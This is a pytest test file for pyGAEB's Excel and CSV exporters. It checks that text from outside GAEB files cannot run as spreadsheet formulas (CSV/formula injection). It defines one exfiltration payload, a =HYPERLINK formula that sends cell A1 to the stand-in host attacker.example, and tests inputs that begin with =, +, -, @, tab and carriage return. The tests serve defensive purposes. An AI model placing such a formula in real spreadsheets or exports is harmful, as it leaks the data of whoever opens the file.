"""Document text never runs as a spreadsheet formula (CSV / formula injection, CWE-1236).

A GAEB file comes from outside: a bidder or client can put ``=HYPERLINK(...)`` or
``=WEBSERVICE(...)`` into a short text, which would run when an estimator opens the
export in Excel and could send the sheet's other cells away.
"""

from __future__ import annotations

import csv
from pathlib import Path

import pytest

from pygaeb import BoQDiff, GAEBParser, diff_to_excel, to_csv, to_excel
from pygaeb.models.document import GAEBDocument

openpyxl = pytest.importorskip("openpyxl")

FIXTURES = Path(__file__).parent / "fixtures"
EVIL = '=HYPERLINK("https://attacker.example/?d="&A1,"Details")'


def _doc_with_short_text(text: str) -> GAEBDocument:
    xml = (FIXTURES / "synthetic_33.X86").read_text(encoding="utf-8")
    escaped = text.replace("&", "&amp;").replace("<", "&lt;")
    return GAEBParser.parse_string(xml.replace("Boden lösen</", escaped + "</", 1),
                                   filename="evil.X86")


def _formula_cells(path: Path) -> dict[str, list[str]]:
    wb = openpyxl.load_workbook(path)
    return {
        ws.title: [str(c.value) for row in ws.iter_rows() for c in row if c.data_type == "f"]
        for ws in wb.worksheets
    }


@pytest.mark.parametrize("mode", ["structured", "full"])
def test_excel_keeps_document_text_as_text(tmp_path: Path, mode: str) -> None:
    out = tmp_path / "evil.xlsx"
    to_excel(_doc_with_short_text(EVIL), out, mode=mode, formulas=True)

    formulas = _formula_cells(out)
    assert not any("HYPERLINK" in f for sheet in formulas.values() for f in sheet)
    # pyGAEB's own totals stay live.
    assert any(f.startswith("=ROUND(") for f in formulas["BoQ"])
    assert any(f.startswith("=SUM(") for f in formulas["BoQ"])
    texts = [c.value for row in openpyxl.load_workbook(out)["BoQ"].iter_rows() for c in row]
    assert EVIL in texts


def test_diff_workbook_keeps_item_text_as_text(tmp_path: Path) -> None:
    before = GAEBParser.parse(FIXTURES / "synthetic_33.X86")
    out = tmp_path / "diff.xlsx"
    diff_to_excel(BoQDiff.compare(before, _doc_with_short_text(EVIL)), out)

    assert _formula_cells(out) == {ws: [] for ws in _formula_cells(out)}
    texts = [str(c.value) for ws in openpyxl.load_workbook(out).worksheets
             for row in ws.iter_rows() for c in row]
    assert any("HYPERLINK" in t for t in texts)


@pytest.mark.parametrize("start", ["=", "+", "-", "@", "\t", "\r"])
def test_csv_escapes_text_a_spreadsheet_would_run(tmp_path: Path, start: str) -> None:
    doc = GAEBParser.parse(FIXTURES / "synthetic_33.X86")
    # Set directly: parsing strips leading whitespace, a builder or caller need not.
    next(doc.iter_items()).short_text = start + "1+1"
    out = tmp_path / "items.csv"
    to_csv(doc, out)

    with out.open(encoding="utf-8", newline="") as f:
        first = next(csv.DictReader(f))
    assert first["short_text"] == "'" + start + "1+1"


def test_csv_never_changes_numbers(tmp_path: Path) -> None:
    xml = (FIXTURES / "synthetic_33.X86").read_text(encoding="utf-8")
    doc = GAEBParser.parse_string(xml.replace("<Qty>10.000</Qty>", "<Qty>-10.000</Qty>", 1),
                                  filename="negative.X86")
    out = tmp_path / "items.csv"
    to_csv(doc, out)

    with out.open(encoding="utf-8", newline="") as f:
        first = next(csv.DictReader(f))
    assert first["qty"] == "-10.000"


def test_csv_can_write_the_text_unchanged(tmp_path: Path) -> None:
    out = tmp_path / "items.csv"
    to_csv(_doc_with_short_text(EVIL), out, escape_formulas=False)

    with out.open(encoding="utf-8", newline="") as f:
        assert next(csv.DictReader(f))["short_text"] == EVIL
